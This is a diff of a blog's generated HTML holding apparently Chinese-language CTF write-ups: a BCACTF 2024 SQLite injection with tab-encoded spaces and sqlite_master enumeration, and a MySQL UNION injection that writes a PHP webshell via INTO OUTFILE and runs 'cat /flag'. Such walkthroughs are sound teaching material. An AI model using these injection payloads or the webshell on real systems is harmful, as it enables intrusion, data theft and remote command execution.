+        <li class="md-meta__item">
           <time datetime="2026-11-21 23:00:00+00:00">2026-11-21</time></li>
         
           <li class="md-meta__item">
@@ -3707,33 +3978,33 @@
 </table>
 <p><strong>所以后面所有 payload 里的空格都写成 <code>%09</code>。</strong></p>
 <h4 id="step-3"><a class="toclink" href="../../bcactf2024-michaelsoft-gring/#step-3">Step 3：确定列数</a></h4>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="mi">1</span><span class="err">'</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="c1">-- </span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="mi">1</span><span class="err">'</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="c1">-- </span>
 </span></code></pre></div>
 <p><strong>URL 编码后：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>1'%09UNION%09SELECT%091--
+<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>1'%09UNION%09SELECT%091--
 </span></code></pre></div>
 <p><strong>只有一列。</strong>（多给几列会报错“SELECT 列数不一致”）</p>
 <h4 id="step-4sqlite"><a class="toclink" href="../../bcactf2024-michaelsoft-gring/#step-4sqlite">Step 4：爆表（SQLite 的关键点）</a></h4>
 <p><strong>SQLite 没有 <code>information_schema</code>，表结构存在 <code>sqlite_master</code> 里：</strong></p>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="mi">1</span><span class="err">'</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sqlite_master</span><span class="c1">--</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="mi">1</span><span class="err">'</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sqlite_master</span><span class="c1">--</span>
 </span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>1'%09UNION%09SELECT%09group_concat(name)%09FROM%09sqlite_master--
+<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>1'%09UNION%09SELECT%09group_concat(name)%09FROM%09sqlite_master--
 </span></code></pre></div>
 <p><strong>返回：<code>search,flag</code></strong></p>
 <p><strong>两张表：<code>search</code> 是正常业务表，<code>flag</code> 是目标。</strong></p>
 <h4 id="step-5-flag"><a class="toclink" href="../../bcactf2024-michaelsoft-gring/#step-5-flag">Step 5：拿 flag——两种做法</a></h4>
 <p><strong>① 直接查那一列</strong></p>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="mi">1</span><span class="err">'</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">flag</span><span class="c1">--</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="mi">1</span><span class="err">'</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">flag</span><span class="c1">--</span>
 </span></code></pre></div>
 <p><strong>② 更省事：查建表语句，一次看到表名+列名</strong></p>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="mi">1</span><span class="err">'</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">sql</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sqlite_master</span><span class="c1">--</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="mi">1</span><span class="err">'</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">sql</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sqlite_master</span><span class="c1">--</span>
 </span></code></pre></div>
 <p><strong>返回类似：</strong></p>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">flag</span><span class="p">(</span><span class="n">flag</span><span class="w"> </span><span class="nb">TEXT</span><span class="p">)</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">flag</span><span class="p">(</span><span class="n">flag</span><span class="w"> </span><span class="nb">TEXT</span><span class="p">)</span>
 </span></code></pre></div>
 <p><strong>看到 <code>flag(flag)</code>，就知道表名和列名都是 <code>flag</code>——一条语句搞定“爆表 + 爆列”。</strong></p>
 <p><strong>最终：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>bcactf{59L_1n1ECTeD_026821}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>bcactf{59L_1n1ECTeD_026821}
 </span></code></pre></div>
 <hr />
 <table>
@@ -3777,19 +4048,19 @@
 <hr />
 <details class="note">
 <summary>SQLite 注入速查</summary>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="c1">-- 表清单</span>
-</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sqlite_master</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">type</span><span class="o">=</span><span class="s1">'table'</span>
-</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>
-</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a><span class="c1">-- 建表语句（表名+列名一次看全）</span>
-</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">sql</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sqlite_master</span>
-</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a>
-</span><span id="__span-38-7"><a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a><span class="c1">-- 拿数据</span>
-</span><span id="__span-38-8"><a id="__codelineno-38-8" name="__codelineno-38-8" href="#__codelineno-38-8"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">flag</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="c1">-- 表清单</span>
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sqlite_master</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">type</span><span class="o">=</span><span class="s1">'table'</span>
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>
+</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="c1">-- 建表语句（表名+列名一次看全）</span>
+</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">sql</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sqlite_master</span>
+</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a>
+</span><span id="__span-28-7"><a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a><span class="c1">-- 拿数据</span>
+</span><span id="__span-28-8"><a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">flag</span>
 </span></code></pre></div>
 <p><strong>SQLite 没有的东西：</strong>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>information_schema    ✗
-</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>load_file()           ✗
-</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>INTO OUTFILE          ✗（默认）
+<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>information_schema    ✗
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>load_file()           ✗
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>INTO OUTFILE          ✗（默认）
 </span></code></pre></div>
 <strong>所以 sqlite 题基本是“把库读干净”，不是 getshell。</strong></p>
 </details>
@@ -4180,67 +4451,67 @@
 <hr />
 <h3 id="_1"><a class="toclink" href="../../myctf-stellar-archive-sqli/#_1">题目概述</a></h3>
 <p>页面底部有个“终端”入口，进去是一块维护控制台。<strong>提示是日语的，先翻译：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>$ archive --status
-</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>[ ok ] 名鑑検索サービス: alive
-</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a>[warn] 端末リリース 2.4.1 (legacy ・ 未統合フロント)
-</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a>
-</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a>$ archive --storage
-</span><span id="__span-45-6"><a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a>[info] エクスポート一時領域: /io/（書き込みは export 機能の実装後）
-</span><span id="__span-45-7"><a id="__codelineno-45-7" name="__codelineno-45-7" href="#__codelineno-45-7"></a>[info] 検索サービス本体は名鑑フロントから未接続
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>$ archive --status
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>[ ok ] 名鑑検索サービス: alive
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>[warn] 端末リリース 2.4.1 (legacy ・ 未統合フロント)
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>
+</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>$ archive --storage
+</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>[info] エクスポート一時領域: /io/（書き込みは export 機能の実装後）
+</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>[info] 検索サービス本体は名鑑フロントから未接続
 </span></code></pre></div>
 <p><strong>翻译过来关键的就一行：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>导出临时区域：/io/（写入需在 export 功能实现后）
+<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>导出临时区域：/io/（写入需在 export 功能实现后）
 </span></code></pre></div>
 <p><strong>这句话等于提前告诉你：</strong><code>/io/</code> 目录可写<strong>。</strong>后面所有操作都是围着这一句展开的。**</p>
 <hr />
 <h3 id="_2"><a class="toclink" href="../../myctf-stellar-archive-sqli/#_2">解题过程</a></h3>
 <h4 id="step-1"><a class="toclink" href="../../myctf-stellar-archive-sqli/#step-1">Step 1：找注入点</a></h4>
 <p><strong>页面有个筛选框，输入 <code>rarity &gt;= 3</code> 会返回一段 JSON，里面把拼好的 SQL 也打出来了：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>SELECT id, name, title, rarity, element, sig FROM witches WHERE rarity &gt;= 3 ORDER BY id ASC
+<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>SELECT id, name, title, rarity, element, sig FROM witches WHERE rarity &gt;= 3 ORDER BY id ASC
 </span></code></pre></div>
 <p><strong>输一个单引号（<code>'</code>），报错——注入点确认。</strong></p>
 <h4 id="step-2"><a class="toclink" href="../../myctf-stellar-archive-sqli/#step-2">Step 2：确定列数</a></h4>
 <p><strong>原查询是 6 个字段（id, name, title, rarity, element, sig），所以 UNION 也要 6 列：</strong></p>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="mi">0</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="mi">0</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span>
 </span></code></pre></div>
 <p><strong>能正常返回，说明列数对上了。</strong></p>
 <h4 id="step-3"><a class="toclink" href="../../myctf-stellar-archive-sqli/#step-3">Step 3：爆库表列</a></h4>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">GROUP_CONCAT</span><span class="p">(</span><span class="k">TABLE_NAME</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">TABLES</span><span class="c1">-- -</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">GROUP_CONCAT</span><span class="p">(</span><span class="k">TABLE_NAME</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">TABLES</span><span class="c1">-- -</span>
 </span></code></pre></div>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">GROUP_CONCAT</span><span class="p">(</span><span class="k">COLUMN_NAME</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">COLUMNS</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">TABLE_NAME</span><span class="o">=</span><span class="s1">'archive_notes'</span><span class="c1">-- -</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">GROUP_CONCAT</span><span class="p">(</span><span class="k">COLUMN_NAME</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">COLUMNS</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">TABLE_NAME</span><span class="o">=</span><span class="s1">'archive_notes'</span><span class="c1">-- -</span>
 </span></code></pre></div>
 <p><strong><code>-- -</code> 是注释掉后面原来的 <code>ORDER BY id ASC</code>（注意 <code>--</code> 后面必须有一个空格）。</strong></p>
 <p><strong>扫出来的表里，与题目相关的就两张：<code>witches</code>（正常数据）和 <code>archive_notes</code>（看起来像隐藏内容）。</strong></p>
 <h4 id="step-4flag"><a class="toclink" href="../../myctf-stellar-archive-sqli/#step-4flag">Step 4：库里的“flag”是假的</a></h4>
 <p><strong>读 <code>archive_notes</code>，看到这么一条：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>封存样本（校验用，非本季名鉴凭证）：MYCTF{d3c0y_4rch1v3_n0t3_d0_n0t_submit}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>封存样本（校验用，非本季名鉴凭证）：MYCTF{d3c0y_4rch1v3_n0t3_d0_n0t_submit}
 </span></code></pre></div>
 <p><strong>注意它自己写着 <code>d3c0y_..._d0_n0t_submit</code>——</strong>这是<strong>诱饵</strong>，交上去就是错的。**</p>
 <p><strong>这题的 flag 不在数据库里。</strong></p>
 <h4 id="step-5"><a class="toclink" href="../../myctf-stellar-archive-sqli/#step-5">Step 5：看看能不能写文件</a></h4>
 <p><strong>既然提示说 <code>/io/</code> 可写，先确认数据库的写权限目录：</strong></p>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="o">@@</span><span class="n">secure_file_priv</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="c1">-- -</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="o">@@</span><span class="n">secure_file_priv</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="c1">-- -</span>
 </span></code></pre></div>
 <p><strong>返回：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>/var/www/html/io/
+<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>/var/www/html/io/
 </span></code></pre></div>
 <p><strong><code>@@secure_file_priv</code> 就是 MySQL/MariaDB 允许 <code>INTO OUTFILE</code> 写入的目录——和终端里那行提示</strong>完全对上<strong>了。</strong></p>
 <p><strong>这说明出题人是故意把这条路留给你。</strong></p>
 <h4 id="step-6-webshell"><a class="toclink" href="../../myctf-stellar-archive-sqli/#step-6-webshell">Step 6：写一个 webshell</a></h4>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="n">rarity</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="s1">'&lt;?php system($_GET[0]);?&gt;'</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">OUTFILE</span><span class="w"> </span><span class="s1">'/var/www/html/io/C.php'</span><span class="c1">-- -</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="n">rarity</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="s1">'&lt;?php system($_GET[0]);?&gt;'</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">OUTFILE</span><span class="w"> </span><span class="s1">'/var/www/html/io/C.php'</span><span class="c1">-- -</span>
 </span></code></pre></div>
 <p><strong>几个必须注意的地方：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>① 路径用 @@secure_file_priv 给的那个，不能写别处
-</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a>② INTO OUTFILE 不能覆盖已存在的文件（第一次写才成功，重写要换文件名）
-</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a>③ 引号要小心：MySQL 写入时会把 " 转义成 \"，
-</span><span id="__span-55-4"><a id="__codelineno-55-4" name="__codelineno-55-4" href="#__codelineno-55-4"></a>   一旦变成 $_GET[\"cmd\"] 就是 PHP 语法错误 → 页面 500
-</span><span id="__span-55-5"><a id="__codelineno-55-5" name="__codelineno-55-5" href="#__codelineno-55-5"></a>④ 所以用 $_GET[0] 这种不带引号的写法最保险
+<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>① 路径用 @@secure_file_priv 给的那个，不能写别处
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>② INTO OUTFILE 不能覆盖已存在的文件（第一次写才成功，重写要换文件名）
+</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a>③ 引号要小心：MySQL 写入时会把 " 转义成 \"，
+</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a>   一旦变成 $_GET[\"cmd\"] 就是 PHP 语法错误 → 页面 500
+</span><span id="__span-40-5"><a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a>④ 所以用 $_GET[0] 这种不带引号的写法最保险
 </span></code></pre></div>
 <p><strong>访问：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>/io/C.php?0=cat%20/flag
+<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>/io/C.php?0=cat%20/flag
 </span></code></pre></div>
 <p><strong>得到：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>MYCTF{9f2c7a41-6d3b-4e85-b0a7-1c8f4d2e6b93}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>MYCTF{9f2c7a41-6d3b-4e85-b0a7-1c8f4d2e6b93}
 </span></code></pre></div>
 <hr />
 <table>
@@ -4284,19 +4555,19 @@
 <hr />
 <details class="note">
 <summary>完整流程</summary>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="c1">-- ① 确认列数</span>
-</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a><span class="mi">0</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span>
-</span><span id="__span-58-3"><a id="__codelineno-58-3" name="__codelineno-58-3" href="#__codelineno-58-3"></a>
-</span><span id="__span-58-4"><a id="__codelineno-58-4" name="__codelineno-58-4" href="#__codelineno-58-4"></a><span class="c1">-- ② 爆表</span>
-</span><span id="__span-58-5"><a id="__codelineno-58-5" name="__codelineno-58-5" href="#__codelineno-58-5"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">GROUP_CONCAT</span><span class="p">(</span><span class="k">TABLE_NAME</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">TABLES</span><span class="c1">-- -</span>
-</span><span id="__span-58-6"><a id="__codelineno-58-6" name="__codelineno-58-6" href="#__codelineno-58-6"></a>
